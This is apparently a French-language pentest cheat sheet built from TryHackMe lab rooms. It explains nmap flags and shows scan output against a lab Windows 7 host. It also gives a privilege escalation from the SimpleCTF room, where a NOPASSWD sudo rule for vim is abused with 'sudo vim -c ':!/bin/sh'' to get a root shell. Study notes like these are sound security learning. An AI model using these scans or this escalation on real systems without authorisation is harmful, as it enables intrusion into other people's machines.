# Pentest

## Pentest AD
[Pentest AD MAP](https://www.xmind.net/m/5dypm8/)

## Outils

### NMAP

Suffixes : 
* -sV : affiche la version
* -sC : affiche les scripts par défaut qui sont activés

Exemples : 
* N°1 : TryHackMe -> [Ice Room](https://tryhackme.com/room/ice)

    $ sudo nmap -sS -Pn -sV 10.10.188.70
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-24 17:24 CEST
    Nmap scan report for 10.10.188.70
    Host is up (0.13s latency).
    Not shown: 988 closed ports
    PORT      STATE SERVICE       VERSION
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    3389/tcp  open  ms-wbt-server Microsoft Terminal Service
    5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    8000/tcp  open  http          Icecast streaming media server
    49152/tcp open  msrpc         Microsoft Windows RPC
    49153/tcp open  msrpc         Microsoft Windows RPC
    49154/tcp open  msrpc         Microsoft Windows RPC
    49158/tcp open  msrpc         Microsoft Windows RPC
    49159/tcp open  msrpc         Microsoft Windows RPC
    49161/tcp open  msrpc         Microsoft Windows RPC
    Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 96.35 seconds

* N°2 : TryHackMe -> [Ice Room](https://tryhackme.com/room/ice)

    $ sudo nmap -sS -sC 10.10.188.70
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-24 17:29 CEST
    Nmap scan report for 10.10.188.70
    Host is up (0.16s latency).
    Not shown: 988 closed ports
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    5357/tcp  open  wsdapi
    8000/tcp  open  http-alt
    |_http-title: Site doesn't have a title (text/html).
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49158/tcp open  unknown
    49159/tcp open  unknown
    49161/tcp open  unknown

    Host script results:
    |_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
    |_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:e6:92:75:0f:81 (unknown)
    | smb-os-discovery: 
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: Dark-PC
    |   NetBIOS computer name: DARK-PC\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2021-09-24T10:29:37-05:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-09-24T15:29:36
    |_  start_date: 2021-09-24T15:18:11

    Nmap done: 1 IP address (1 host up) scanned in 138.91 seconds


### Escalade de privilège

Exemple : 
* N°1 : TryHackMe -> [SimpleCTF Room](https://tryhackme.com/room/simplectf)

    <br/>$ sudo -l
    <br/>User mitch may run the following commands on Machine:
    <br/>(root) NOPASSWD: /usr/bin/vim

    <br/>$ sudo vim -c ':!/bin/sh'
    <br/># ^[[2;2R^[]11;rgb:3030/0a0a/2424^G
    <br/>/bin/sh: 1: ot found
    <br/>/bin/sh: 1: 2R: not found
    <br/># whoami
    <br/>root



